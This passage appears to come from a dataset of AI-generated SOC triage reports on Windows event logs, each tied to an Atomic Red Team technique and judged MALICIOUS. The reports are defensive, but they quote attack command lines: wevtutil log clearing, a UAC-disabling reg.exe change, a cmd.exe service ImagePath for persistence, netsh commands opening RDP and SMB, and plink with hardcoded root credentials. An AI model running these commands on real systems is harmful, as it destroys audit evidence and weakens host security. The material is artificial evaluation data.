     - `""cmd.exe"" /c C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1027.004.exe ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1027.004\\src\\calc.cs""`
   - Such actions in temporal paths are common techniques used by attackers to compile malware or perform reconnaissance.

### Conclusion
Given the identified indicators, the logs suggest actions consistent with malicious intent:
- The systematic clearing of event logs by a privileged user account is a known tactic for erasing traces of illicit activities.
- The NTLM logon from a remote address using a privileged account shortly before these logs were cleared emphasizes the suspicious nature.
- The compilation of code within a temporary directory further indicates potential preparation for malicious execution attempts.

### Recommendation for Resolution
- **Resolution: MALICIOUS** - The combination of logs being cleared, suspicious processes being executed, and network activities involving a privileged account strongly indicate malicious activities.

### Guidance on How to Proceed
1. **Immediate Response:**
   - Disable or isolate the affected user account ""admin_test"" to prevent further unauthorized access.
   - Conduct a thorough review of other systems and assets that may have been accessed using these credentials.
   - Collect and preserve forensic evidence for detailed analysis and potential legal actions.

2. **Investigation and Containment:**
   - Analyze the script and executable involved (`calc.cs` and `T1027.004.exe`) to understand its intent.
   - Investigate potential phishing or attack vectors that could have led to the compromise of ""admin_test"".
   - Monitor network traffic for further signs of malicious activity from IP `192.168.0.102`.

3. **Preventive Measures:**
   - Enforce multi-factor authentication (MFA) and review privilege access management policies.
   - Implement more stringent logging and alerting mechanisms to detect and respond to similar activities swiftly.
   - Educate users on recognizing phishing attempts and securing their accounts.

Taking these steps will aid in containing the threat and preventing similar incidents in the future."
Rundll32 with Ordinal Value,"After analyzing the provided Windows event logs, several events indicate potentially malicious behavior:

1. **Event Log Clearing:** Several events are seen where the `wevtutil.exe` command was used to clear logs, including Security, System, and Windows PowerShell logs. The events are initiated by ""SERVER002\\admin_test,"" a user with administrative privileges. Log clearing is often used by attackers to cover their tracks and prevent detection.

    - Sysmon Event ID 1 and 5 (multiple instances): `wevtutil.exe` executing commands like `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`, `C:\\Windows\\System32\\Sysmon` and `Security` channel.
    - Security Event ID 1102: Security log cleared by ""admin_test.""

2. **Suspicious Process Execution:**
   - A `rundll32.exe` execution is noted with a DLL path in the temporary directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.010\\bin\\AllTheThingsx64.dll`, which seems to be part of the Atomic Red Team, a well-known testing toolset for attack simulation. While this tool itself is not malicious, its presence, particularly in combination with log clearing, can indicate the presence of a red team exercise or unauthorized penetration testing without prior approval.
   
3. **Use of Privileged Accounts:** The user ""admin_test"" is seen running several privileged operations, such as:
   - Clearing event logs
   - Using `rundll32` in conjunction with suspicious DLLs.

4. **Active Directory Account (""admin_test""):** The use of an account like ""admin_test"" is also worth noting, as it carries high privilege capabilities (as seen from events granting various privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, and more).

5. **Normal Activity:**
    - There are various software update processes, including ones for Microsoft Edge detected, which align with normal operating system and application update behaviors.

**Assessment:**
Given the combination of `wevtutil.exe` log clearing records, combined with the suspicious execution of `rundll32.exe` with a known red team DLL, these actions are highly indicative of unauthorized or potentially malicious activity. This suggests either a security breach attempt or internal security testing activities that were not properly communicated or authorized.

**Recommendation:**
1. Immediately initiate a security incident response process to determine if these activities were authorized as part of internal security tests or if they represent unauthorized access.
2. Review the system configuration and audit logs further for any anomalies around the timestamps provided.
3. Confirm whether ""admin_test"" is an active and necessary account or if it should be disabled.
4. Strengthen security configurations on the CEO machine, especially concerning administrative access and monitoring for any recurrence of similar activities.

**Conclusion: Resolution:** **MALICIOUS** The actions recorded in these logs are consistent with potential malicious activity. Further investigation is necessary to ascertain the full extent of the compromise and prevent any potential data loss or network infiltration."
ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,"### Detailed Analysis of the Logs:

Upon reviewing the provided event logs, several activities stand out:

1. **Sysmon Events:**
   - There is a sequence of events involving the execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. This combination is commonly seen when clearing event logs, which can be an indicator of an attempt to cover tracks.
   - Subsequently, `cmd.exe` is executed with a command line that includes `plink.exe`, a known tool for making remote connections via SSH. The command line arguments include hardcoded credentials (`-l ""root"" -pw ""pass""`), which is an indicator of unauthorized access or lateral movement attempts.
   - The integrity level of these processes is high, indicating they were executed with elevated privileges.

2. **System Log:**
   - Event ID 104 entries indicate that the event logs for the `System` and `Windows PowerShell` channels were cleared by `admin_test`. Log clearing without apparent justification can indicate malicious intent to erase fingerprints.

3. **Security Log:**
   - Event ID 1102 confirms that the `Security` log was also cleared, reinforcing the suspicion that a user attempted to cover their activities.
   - The presence of several Event ID 4624 (logon successes) and Event ID 4672 (special privileges assigned) is typical; however, given the context, it may be associated with unauthorized actions performed using the `admin_test` account.

4. **Application Log:**
   - Contains routine entries regarding the Software Protection Platform Service and does not indicate suspicious activity.

### Assessment of the Situation:

- **Suspicious Activity:** The logs indicate that an individual with system-level access (by the use of `admin_test` account) executed commands that are commonly associated with attempts to manipulate or gain unauthorized access (e.g., clearing logs, using `plink` with SSH credentials).
- **Potential Malicious Activity:** The combination of clearing logs and using tools for potential lateral movement or data exfiltration (like `plink`) strengthens the case for a potential security incident.
- **Risk Factor:** High. The use of unauthorized credentials and log clearing indicates possible compromise and intent to obfuscate actions from system observers.

### Final Resolution: MALICIOUS

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Isolate the affected system (`Server002`) from the network to prevent further unauthorized actions or data exfiltration.
   - Notify your incident response team to perform a detailed forensic analysis of the system.

2. **Investigation:**
   - Obtain and review additional logs from network devices to identify potential lateral movement or data breach.
   - Analyze file integrity and access logs for changes in critical directories and files.

3. **Mitigation:**
   - Reset passwords for all privileged accounts, especially `admin_test`.
   - Assess the need to audit and tighten user access controls and log monitoring mechanisms.

4. **Post-Incident:**
   - Conduct a comprehensive review of security policies to prevent similar incidents. Implement stricter access controls and continuous monitoring solutions to detect such activities in real-time."
Service ImagePath Change with reg.exe,"Upon reviewing the provided logs, there are several elements indicating suspicious and potentially malicious activity that require immediate attention.

### Suspicious Findings:

1. **Event Log Clearing**:
   - **Security Log Clearing**: The Security log shows an event (EventID: 1102) indicating that the event log was cleared by the user `admin_test`. This is a significant red flag, as clearing security logs is often performed by malicious actors to cover their tracks.
   - **System and PowerShell Log Clearing**: System logs (EventID: 104) and PowerShell logs were also cleared shortly after, which aligns with typical behavior seen in security breaches where logs are erased to hide unauthorized activities.

2. **Multiple Execution of `wevtutil`**:
   - The presence of multiple `wevtutil` executions with the `cl` (clear log) argument for different logs (Sysmon, Application, System, Security, Windows PowerShell) in quick succession is highly indicative of an attempt to hide actions by clearing various event logs systematically.

3. **Potential Persistence Mechanism**:
   - A command executed via `cmd.exe` to create a service (`calcservice`) modifying the registry to run `cmd.exe`, observed in the command line `reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\calcservice"" /f /v ImagePath /d ""C:\Windows\system32\cmd.exe""`. This could be a tactic to maintain persistent access on the system.

4. **Unusual Process Execution**:
   - Execution of PowerShell (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe) by the user `SERVER002\admin_test`. While execution of PowerShell itself is not inherently suspicious, in the context of the other activities noted, it warrants further inspection.

### Malicious Activities:

Based on the events in the logs, there is strong evidence suggesting malicious activity:
- **Simultaneous Log Clearing**: Clearing Security, System, and PowerShell logs is a common step in post-exploitation to hide evidence of intrusion.
- **Use of `wevtutil` for Log Manipulation**: The repeated use of `wevtutil.exe` for clearing logs confirms intentional log tampering.
- **Registry Modification for Potential Backdoor**: Adding registry entries for a service that executes `cmd.exe` can be part of an attacker establishing persistence.

### Assessment:
This evidence indicates a compromise where the attacker is attempting to cover tracks by deleting logs and possibly setting up registry keys for persistence.

### Resolution: MALICIOUS

### Guidance:
- **Immediate Network Isolation**: Isolate the affected machine, `Server002`, from the network to prevent further spread or data exfiltration.
- **Full Forensic Investigation**: Conduct a comprehensive forensic analysis on the system to identify the entry point, full extent of the compromise, and any other affected systems.
- **Log Analysis Across Network**: Review similar logs from other critical machines to find indicators of widespread intrusion.
- **Credential Audit**: Reset credentials for `admin_test` and any other potentially compromised accounts.
- **Security Patches and Monitoring**: Ensure all systems are patched for vulnerabilities and enhance log monitoring to catch any future attempts early.
- **Update Incident Response Plan**: Utilize findings from this incident to update response protocols and preventative measures."
Microsoft.Workflow.Compiler.exe Payload Execution,"### Detailed Analysis:

Upon reviewing the series of provided Windows event logs, I'll break down some distinct patterns and anomalies that could help in assessing the activity.

#### Suspicious or Anomalous Behavior:
1. **Log Clearance**: Multiple log clearance events are captured in the logs:
   - Security event ID 1102 and System event ID 104 indicate the security and system logs were cleared by the user `admin_test` at the same timestamp (`2024-10-25 21:21:58.x`). Clearing logs unannounced or without a legitimate reason can indicate malicious intent to cover tracks.
   
2. **Use of `wevtutil`**: There are multiple instances of `wevtutil` being executed by `admin_test` to clear specific logs, such as Sysmon (`Microsoft-Windows-Sysmon/Operational`), Application, Security, and Windows PowerShell channels. This follows the log clearance in the security and system event logs.

3. **PowerShell Usage**: The execution of PowerShell with suspicious command-line arguments:
   - PowerShell is invoked to run a `microsoft.workflow.compiler.exe` with a file located in a temporary folder that references `AtomicRedTeam`, a known adversarial simulation framework. It suggests potential testing or execution of known TTP (Tactics, Techniques, and Procedures), which may be suspicious without appropriate context.

4. **Unhandled Exception**: The `microsoft.workflow.compiler.exe` throws an `Unhandled Exception`, which results in a `DirectoryNotFoundException`. While this could potentially be a misconfiguration, its connection with Atomic Red Team and log clearance activities is suspect.

5. **Event log and .NET Runtime Errors**: Application errors that align with the PowerShell script execution and manipulation of directories signal potential issues introduced by malicious scripts or unintended consequences of executed commands.

6. **High Integrity PowerShell and File Access**:
   - The integrity level of PowerShell runs and file access under high privileges could potentially be aligning with privilege escalation techniques.

#### Indicators of Malicious Activity or Compromise:
- The specific sequence of log clearance, especially by `admin_test`, combined with running a suspicious PowerShell script potentially aimed at TTP simulation, indicates potential malicious activity.
- The combination of using legitimate system administration utilities to manipulate logs (`wevtutil.exe`) and attempting adversarial techniques (Atomic Red Team reference) are often associated with malicious intent.

### Assessment of the Situation:
The activity captured in the logs strongly suggests malicious intent because:
- There's clear evidence of log manipulation and clearance.
- Tools and file paths related to known offensive security frameworks are being used.
- Practices align with techniques commonly used to cover tracks post-compromise.

### Resolution:
**MALICIOUS** - The logs contain a series of activities, including deliberate log clearance, execution of potentially adversarial scripts, and high integrity operations, which are consistent with malicious behavior designed to evade detection and potentially establish persistence or explore vulnerabilities within the system.

### Guidance on How to Proceed:
1. **Immediate Containment**: Isolate the affected system (Server002) to prevent potential lateral movement within the network.
2. **Detailed Investigation**: Conduct a deeper investigation into the user account `admin_test` to determine if it was compromised.
3. **Forensic Analysis**: Retrieve and analyze any evidence related to the execution of PowerShell scripts and the directories manipulated.
4. **Incident Response**: Engage with your organization's incident response team to review and respond according to established protocols.
5. **Review and Revise Security Policies**: Ensure that policies are updated to log suspicious activities and that security monitoring is enhanced with anomaly detection for similar threats in the future."
Activities To Disable Secondary Authentication Detected By Modified Registry Value,"Based on the analysis of the provided Windows event logs, the following observations and assessments were made:

1. **Log Deletion Activity**: The logs indicate that the system, PowerShell, and security event logs were cleared by a user named ""admin_test"". The specific events involved are:
   - Event ID 104 (System log)
   - Event ID 1102 (Security log)

   Clearing event logs is generally considered suspicious activity, especially if not part of regular maintenance or administrative practices. This action can be indicative of an attempt to cover tracks following unauthorized or malicious activity.

2. **Usage of `wevtutil`**: The Sysmon logs show frequent usage of `wevtutil.exe` to clear various logs (System, Application, and Windows PowerShell). The command line actions are issued by the same user ""admin_test"", which aligns with the log clearance activities.

3. **Privilege Execution**: Event ID 4672 in the Security log shows that ""admin_test"" was granted a series of high-level privileges often associated with administrative tasks (e.g., SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege). While such privileges might be standard for administrators, in conjunction with other activities, they could be leveraged for malicious purposes.

4. **Changes to Registry**: There is evidence of registry modifications carried out via `cmd.exe` using `reg.exe` to adjust settings under `HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor`. Such changes could potentially impact security features or settings.

5. **Process Execution Details**: 
   - Processes like `whoami.exe` and `hostname.exe` were executed, possibly to gather system information. 
   - There are processes and activities linked to Microsoft Edge updates; however, they do not appear particularly abnormal unless there is further context on potential exploit vectors via these processes.

6. **Time Change Observation**: The Security log shows time change events (Event ID 4616), which might have been part of regular system adjustments, but can also be used to manipulate system settings relevant to file timestamps or other time-dependent behaviors.

### Assessment and Conclusion:

The activities logged such as system log clearance, especially through the `wevtutil` commands, the change in registry configurations, and the extent of privileges used, strongly indicate attempts to obfuscate actions and change system configurations without proper documentation or context. This behavior is typically not associated with standard or benign administrative tasks, especially on high-profile systems like that of a CEO's machine.

### Resolution:

- **MALICIOUS**: The log entries point towards confirmed malicious activities. The combination of log clearing, high privilege usage, registry changes, and system command-line utility usage suggests an attempt to manipulate and potentially compromise the system.

### Guidance:

1. **Immediate Action**: Isolate the affected system to prevent any further potential damage or exfiltration of data.
2. **Review User Access**: Scrutinize access and activities by ""admin_test"". Ensure that the account is not compromised and confirm whether any actions were authorized.
3. **Conduct Further Investigation**: Dig deeper into network traffic, file access, and any failed login attempts during this timeframe to ensure the full scope of activities is understood.
4. **Restore from a Trusted Backup**: If possible, restore the system to a known good state after verifying the backups are clean.
5. **Strengthen Monitoring**: Increase logging and monitoring, paying special attention to critical system log files, user activities, and privilege changes.
6. **Security Awareness and Training**: Conduct training on identifying and reporting suspicious activities to ensure employees act quickly on potential security issues."
Rundll32 execute payload by calling RouteTheCall,"Upon reviewing the provided logs, several points of concern have been identified:

### Windows PowerShell Logs

- **Suspicious PowerShell Activity**: The PowerShell logs show instances of `powershell.exe` executing with the command line that includes `rundll32.exe` invoking `zipfldr.dll` to launch `calc.exe`. This behavior is unusual and suspicious because it involves a less typical method of executing a Windows executable (calculator in this instance) through PowerShell and `rundll32.exe`. This technique can be used for obfuscating commands or payloads often seen in malware or malicious scripts.

### System Logs

- **Event Logs Cleared**: Events show that the system, security, and PowerShell logs were cleared by the user `admin_test`. Clearing logs is a common technique used to cover tracks and is generally considered a red flag for malicious activity.

### Security Logs

- **Log Cleared Alert**: Consistent with the above, the security logs indicated that the logs were cleared, which is a suspicious activity if not part of a regular maintenance routine explicitly logged and justified.

### Sysmon Logs

- **Multiple `wevtutil.exe` Executions**: The events indicate multiple instances where `wevtutil.exe` was used to clear different logs like System, Application, and Security logs. This utility is legitimate but used in a context that matches the clearing of logs pattern. This is indicative of potential malicious intentions to hide activities.
  
- **Process Execution Pattern**: The logs demonstrate a suspicious execution pattern involving `wevtutil.exe` commands clearing logs almost simultaneously in a high-integrity level context, under the `admin_test` user.

### Overall Assessment

The findings outlined above suggest the presence of potentially malicious activities in the provided logs. The suspicious use of PowerShell to execute a command via `rundll32.exe` to launch `calc.exe`, coupled with the systematic clearing of logs using `wevtutil.exe`, strongly implies an effort to execute potentially unauthorized actions and mask these by manipulating event logs.

### Resolution

Resolution: **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Containment**: Isolate the host machine (Server002) from the network to prevent further potential malicious activities or lateral movement.
   
2. **Forensic Investigation**: Perform a thorough forensic analysis of the isolated machine to identify the source of compromise, whether additional payloads were deployed, and any other persistence mechanisms.

3. **Review User Actions**: Investigate user `admin_test` for any anomalous behavior patterns or any signs of compromised credentials.

4. **Monitoring and Logging**: Enhance monitoring across the network; ensure logging cannot be easily manipulated in the future. Consider implementing more granular audit policies and secure use of administrative tools.

5. **Security Protocols**: Review and tighten security protocols for account usage, particularly those with administrative privileges, ensuring least privilege principles are applied.

By swiftly addressing these areas, you can minimize the impact and root out any residual malicious elements from your environment."
Mimic Ransomware - Allow Multiple RDP Sessions per User,"**Analysis of the Windows Event Logs:**

1. **Command Line and Event Log Clearing:**
   - The logs show multiple instances of `wevtutil.exe` being executed with the `cl` (clear) command, which is used to clear event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Windows PowerShell` channels). Clearing logs can be indicative of malicious activity as attackers may do this to hide their tracks.
   - The `Security` event log was also cleared (`EventID: 1102`), further supporting evidence of concealment efforts.

2. **Suspicious Commands and Registry Modifications:**
   - A command was executed via `cmd.exe` to modify the registry `HKLM\System\CurrentControlSet\Control\Terminal Server` to alter the `fSingleSessionPerUser` value. This can be used for enabling multiple remote desktop sessions, which is a common tactic used by attackers to maintain persistence on compromised systems.

3. **Privilege Escalation:**
   - The logs document an instance of `wevtutil.exe` being run by a user `SERVER002\admin_test` with high integrity levels and privileges (Event ID 4672 confirms lots of privileges were held), suggesting potential privilege escalation, or an unauthorized user attempting to manipulate logs with escalated rights.

4. **Time Manipulation:**
   - There are constraints relating to the system time being altered slightly (`EventID: 4616`). Time changes, especially in conjunction with log clearing, can be a method used by attackers to confuse log timelines.

**Assessment:**

- **Overall Threat Indicators:**
  - **Event Log Clearing:** Indicates potential malicious cover-up.
  - **Registry Changes:** Direct registry modification always invokes suspicion, especially when aimed at terminal server settings.
  - **Time Manipulations:** Further supports attempts to hide activities.

**Resolution:**

- **Resolution**: **MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Incident Response:**
   - Isolate the system from the network to prevent further spread of potential malware.
   - Begin an in-depth forensic analysis to uncover the full scope of the intrusion.

   - Review endpoint detection and response alerts for additional connections from the suspected compromised account.
   - Alert the affected users and the security team to initiate remediation efforts.

3. **Log and System Recollection:**
   - Retrieve available backups of logs for further analysis to recover cleared events.
   - Implement stricter monitoring on critical machines and accounts.

4. **Security Improvements:**
   - Implement stricter access control measures and consider multi-factor authentication for administrative accounts.
   - Assess and update incident response plans according to findings from this event.

These findings suggest an already active intrusion with the intruder taking steps to cover their tracks, making it crucial to act quickly to mitigate potential damages and reinforce security protocols."
CheckIfInstallable method call,"### Detailed Analysis

**1. Clearing and Filtering of Logs:**
- **Event ID 1102 (Security Log) and Event ID 104 (System Log):** These events indicate that the log files have been cleared, which is a common tactic used by attackers to cover their tracks. The user associated with these actions is ""admin_test"" on ""SERVER002."" This behavior is suspicious because legitimate users rarely have a reason to clear logs, and if they do, it should typically be documented and authorized.

**2. Process Execution and Command Line Arguments:**
- **PowerShell Activity:** 
  - There are multiple instances of `powershell.exe` executing commands that involve loading modules and executing .NET framework-related tasks. Notably, `InstallUtilTestHarness.ps1` and what appears to be an Atomic Red Team test script (`T1218.004`) are invoked. This specific activity is indicative of adversarial activities that utilize Living off the Land Binaries and Scripts (LOLBAS) for executing potentially malicious code.
  - The PowerShell command provides `Invoke-BuildAndInvokeInstallUtilAssembly` which is known for bypassing security controls. This is suspicious as it is often used by attackers to execute malicious payloads through PowerShell.

- **Event Utility Execution using `wevtutil.exe`:** 
  - `wevtutil.exe` was used several times to clear logs (`/cl` argument) of different channels such as Sysmon, Application, and Security. This aligns with typical activity intended to remove traces of actions from logs and is often malicious when not aligned with approved maintenance.

**3. .NET Activity:**
- The execution of `csc.exe` (Visual C# Command Line Compiler) and subsequent execution of `cvtres.exe` under PowerShell processes. This could indicate an attempt to compile and execute code on the fly, a technique often associated with advanced attackers.

**4. System Update Activities:**
- There are various entries related to Microsoft Edge Update processes. They appear legitimate as these processes are standard system update activities. However, mixed with suspicious PowerShell activities, these could be a way to blend in with normal operations if manipulated by an attacker.

**5. User Context:**
- The activity is conducted under the user ""SERVER002\admin_test,"" which possesses high integrity level permissions. This level of access could imply an insider threat or credential abuse scenario.

### Assessment of the Situation

The activities observed in the logs indicate a high likelihood of malicious activity. The clearing of logs, combined with complex command executions through PowerShell and suspicious crafting and execution of potentially malicious scripts, suggest an attempt to evade detection while executing unauthorized activities on the system.

### Threats and Risks Identified

- **Potential Data Breach or System Compromise:** Given the nature of the activities, it is likely that the actor is attempting to exploit the system to gain further access or execute unauthorized code.
- **Insider Threat or Compromised Admin Account:** The use of an admin account to conduct these activities suggests either insider involvement or that administrative credentials have been compromised.

### Guidance on How to Proceed

1. **Immediate Response:**
   - Isolate the network of the affected system to prevent any potential spread of malicious activity.
   - Conduct a thorough review of the ""admin_test"" account to verify its legitimacy and usage history.
   - Collect forensic images of the involved systems for deeper analysis.
   
2. **Further Investigation:**
   - Analyze any other systems that might have had interactions with SERVER002 around the same time.
   - Check for any unauthorized access or changes in other critical systems.

3. **Mitigation Actions:**
   - Reset credentials for administrative accounts and review account permissions.
   - Implement increased monitoring on the network to detect any similar behavior in real time.

### Resolution

**MALICIOUS -** The logs present activities strongly indicative of malicious behavior, including the clearing of event logs, use of PowerShell for potential unauthorized code execution, and attempts to obfuscate actions. Immediate action should be taken to investigate and mitigate the apparent threat."
Allow SMB and RDP on Microsoft Defender Firewall,"Upon reviewing the provided Windows event logs, the following findings have been identified that indicate potentially suspicious or malicious activity:

### Analysis:

1. **Use of `wevtutil.exe`:**
   - The logs show multiple instances of `wevtutil.exe` being used to clear event logs:
     - Sysmon/Operational
     - Application
     - Security
     - System
   - The frequent invocation of `wevtutil.exe` with the command-line options to clear logs (`cl`) under the account `SERVER002\\admin_test` with high integrity level is suspicious. This behavior is often associated with attempts to cover tracks after unauthorized activities.

2. **Clearing of Event Logs:**
   - Security log (EventID: 1102) and System log (EventID: 104) show that logs were cleared by the user `admin_test`.
   - Clearing event logs without a legitimate reason, especially across multiple log types, is a strong indicator of potential malicious intent or activity attempting to evade detection.

3. **Time Manipulation Observed:**
   - The Security log (EventID: 4616) contains two events showing very close timestamps (`11:37:58.7910540` and `11:37:58.7921103`) involving the change of system time, which can be suspicious as altering system time can affect log generation and order.

4. **Suspicious Command-line Activity:**
   - There is a log entry for `cmd.exe` executing `netsh` commands to:
     - Enable remote desktop: `netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes`
     - Enable file and printer sharing: `netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes`
   - These actions performed without clear context or logging can be indicative of an attacker attempting to set up persistence or accessibility to the machine via remote means.

5. **High Integrity Processes:**
   - The user `admin_test` is executing high-integrity level operations without an apparent business need, which raises concerns about privilege misuse.

6. **Activity from System User Accounts:**
   - There are multiple instances of the `NT AUTHORITY\\SYSTEM` account being used, which is expected for some processes but can also alert if associated with unintended or unauthorized actions.

### Assessment:

Considering the above observations, the activities noted in the Windows event logs are far from typical benign system operations. The consistent clearing of logs, combined with the enabling of remote access rules and execution of processes under elevated privileges without a clear necessity, strongly suggest an attempt to carry out system alterations discreetly.

### Resolution:

- **MALICIOUS**: The combination of log clearing, remote access enabling, and system time manipulation points to activity characteristic of a malicious actor attempting to hide traces and maintain access to the system.

### Guidance:

1. **Immediate Actions**:
   - Isolate the affected machine from the network to prevent further potential malicious actions.
   - Conduct a full forensic investigation on the compromised system to identify any other potential malicious artifacts or changes.
   - Review other systems in the network for similar signs of compromise.

2. **Long-term Actions**:
   - Implement stricter monitoring and alerting for events like log clearance and unexpected high-integrity operations.
   - Review and harden access controls, especially for privileged accounts.
   - Conduct cybersecurity training for users to recognize and prevent such activities."
attrib - Remove read-only attribute,"### Detailed Analysis of Windows Event Logs

**1. Suspicious or Anomalous Behavior:**

- **Event Log Clearing:** Multiple `wevtutil.exe` executions are observed (Event ID 104), indicating log clear operations for System, Windows PowerShell, and Security logs. The user `SERVER002\\admin_test` executed these actions.
- **Command Execution:** Processes like `cmd.exe` and `attrib.exe` were run with potentially dubious command-line arguments. For instance, using `cmd.exe` with arguments to check/create files within temporary directories and manipulating file attributes.
- **Privilege Levels:** The processes are operated at a high integrity level, particularly those run by `admin_test`, suggesting actions performed with elevated privileges.
  
**2. Indicators of Malicious Activity:**

- **Log File Deletion:** The clearing of logs, especially the Security log, often suggests an attempt to cover tracks, a common post-exploitation action.
- **Use of `wevtutil.exe`:** The explicit command to clear event logs is a known method for attackers to hide their activities.
- **Execution of Elevated Commands:** Running shell commands (`cmd.exe`, `attrib.exe`) possibly to manipulate file attributes at elevated privileges can suggest malicious intent, especially when combined with log clearing activities.
- **Unexpected File Manipulations:** The creation and attribute change of files in the `%temp%` location without any clear benign purpose.

**3. Patterns and Lack of Legitimate Use Cases:**

- The series of events capture a sequence consistent with efforts to either establish persistence or execute reconnaissance commands with covering tracks. The involved user `admin_test` may indicate either an insider threat or compromised credentials.
- The involvement of tools typically associated with administrative and maintenance tasks in a suspicious sequence of actions—such as `wevtutil`, `attrib`, and frequent `cmd` utilization—outside typical maintenance windows or established usage patterns highlights a potential compromise.
  
### Assessment of the Situation

The outlined activities indicate a chain of suspicious and potentially malicious actions. An essential sequence includes clearing logs immediately after executing command-line scripts affecting system state or file integrity, operating at elevated privilege levels typically associated with administrative or malicious control. These activities suggest a deliberate attempt to alter system integrity and conceal the operations from audits or security monitoring.

### Threats or Risks Identified

- **Potential Credential Compromise:** Use of `admin_test` for potentially harmful actions suggests either misuse by the account holder or compromise by an external entity.
- **Possible System Intrusion:** The sequence of command executions and log clearances may imply unauthorized access looking to modify, retrieve, or manipulate system data or settings.
- **Data Integrity Risk:** File manipulations in temporary directories and attribute changes pose risks for data tampering or the installation of malicious tools.

### Guidance on How to Proceed

- **Immediate Actions:**
  - **Credential Reset:** Urgently reset credentials for the `admin_test` account and other privileged accounts.
  - **System Isolation:** Segregate the affected system (`Server002`) to prevent lateral movement or further propagation.
  - **Log and Network Monitoring:** Enhance monitoring of logs and network activities for similar patterns across other systems.
  
- **Further Investigation:**
  - Assess the timeline of actions on `Server002` for unauthorized access points or malware implants.
  - Conduct a deeper forensic analysis to identify any data exfiltration or system policy alterations.
  - Review access logs and correlate with external network connections to determine the potential attacker origin.

- **Long-term Mitigation:**
  - Implement stricter access controls and logging mechanisms.
  - Conduct security awareness training specifically targeting log manipulations and command-line abuses.
  - Consider deploying intrusion detection systems and advanced threat protection solutions to identify sophisticated attack patterns.

### Final Resolution

Given the clear indicators of system manipulation and log clearance by an admin-level account, the conclusion of this investigation is classified as **MALICIOUS**."
Windows HideSCAVolume Group Policy Feature,"### Analysis of the Provided Windows Event Logs

#### Suspicious and Anomalous Behavior

Upon reviewing the logs, several suspicious activities stand out:

1. **Log File Clearance (System and Security Logs):**
   - Multiple logs indicate that system logs have been cleared on ""2024-10-24 16:01:58"" by the user `admin_test`. This activity is captured in the system, security, and Sysmon logs.
   - Clearing event logs can be a strong indicator of malicious intent as attackers typically clear logs to cover their tracks.

2. **Wevtutil.exe Use:**
   - Multiple executions of `wevtutil.exe`, the Windows Eventing Command Line Utility, were logged with command-line arguments to clear logs (`wevtutil.exe cl`). This utility was run under the account `SERVER002\admin_test` with a high integrity level.
   - The sequence includes clearing ""System"", ""Application"", and ""Windows PowerShell"" channels, which matches the cleared channels in the event logs.
   - This coordinated clearing of logs suggests a deliberate attempt to erase activity traces.

3. **Administrative Privileges:**
   - The user `admin_test` has administrative privileges, which include `SeDebugPrivilege`, `SeSecurityPrivilege`, and others, granting significant control over the system. Coupled with log clearing, this access is potentially dangerous.

4. **Registry Modification:**
   - A process executed by `cmd.exe` runs a command to modify the registry key `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` with the value `HideSCAVolume`.
   - This modification indicates an attempt to alter system behavior, which could be part of persistence or concealment strategy. The use of `cmd.exe` and `reg.exe` suggests script execution to alter configurations.

5. **Multiple Edge Update Executions:**
   - Numerous executions of Microsoft Edge Update processes were logged, but they appear consistent with legitimate software update activities. They do not directly relate to suspicious behavior but were noted here for completeness.

#### Indicators of Malicious Activity

- **Log Cleared Events Analysis:**
  - Event IDs `104` (System), `1102` (Security log cleared) are direct indicators of log clearing commands executed by `admin_test`.
  - Events like these, combined with the user context, suggest attempts to conceal tracks after execution of potentially unwanted or harmful activities.

- **Registry and Command Execution:**
  - The presence of `cmd.exe` and `reg.exe` involved in registry modifications points towards system configuration changes that can be malicious if done without user consent or valid administrative task execution.

#### Assessment

Upon careful review, these activities fall under suspicious behavior, with potential indicators of compromise primarily due to the log clearance and unauthorized registry modification attempts. 

Given these findings, the activities revealed by the logs indicate the following resolution:

**Final Resolution: MALICIOUS**

### Recommendations for Further Actions

1. **Immediate Threat Containment:**
   - Isolate the machine (Server002) from the network to prevent any potential propagation of malicious activities.

2. **User Account Review:**
   - Immediately review and audit the `admin_test` account for any unauthorized access or activities. Consider disabling or investigating how these actions took place under this account.

3. **Log and Network Monitoring:**
   - Enhance logging and monitoring on critical systems to capture any subsequent malicious activities. Look closely at other administrative actions performed by the suspect account.

4. **Incident Response Engagement:**
   - Involve the incident response team to perform a deeper forensic analysis of the system to determine the scope and vector of the attack.

5. **Policy Enforcement:**
   - Review event log policies and harden systems against unauthorized log clearance. Consider implementing alerts for critical log modification activities.

These steps are essential to further investigate the identified malicious behavior, protect sensitive information, and reinforce the security posture."
Disable UAC using reg.exe,"Upon reviewing the provided Windows event logs from the CEO's machine, there are several indicators and activities that warrant a closer examination to determine potential threats.

### Analysis of Logs:

1. **Log Clearing Events**: 
   - **System Log (Event ID 104)**: The system logs and Windows PowerShell logs were cleared by the user ""admin_test"". Clearing logs can be indicative of an attempt to cover tracks post-compromise. The presence of sequential log clearing across different event log channels (Sysmon, Application, System, and Security) suggests a deliberate action to hide activity.

2. **Command Line Activity**:
   - **Sysmon Log (Event ID 1)**: Multiple instances of `wevtutil.exe` are seen clearing various Windows event logs (Application, Security, System, Windows PowerShell). The command line shows logs being cleared suspiciously under the context of the user `admin_test` which aligns with the actions seen in the System log.
   
3. **Registry Modification**:
   - **Sysmon Log (Event ID 1)**: The command `reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f` executed by `cmd.exe` alters User Account Control (UAC) settings. Disabling UAC is often a technique used by attackers to ease privilege escalation and execution of malicious binaries without consent prompts.

4. **Time Discrepancy Events**:
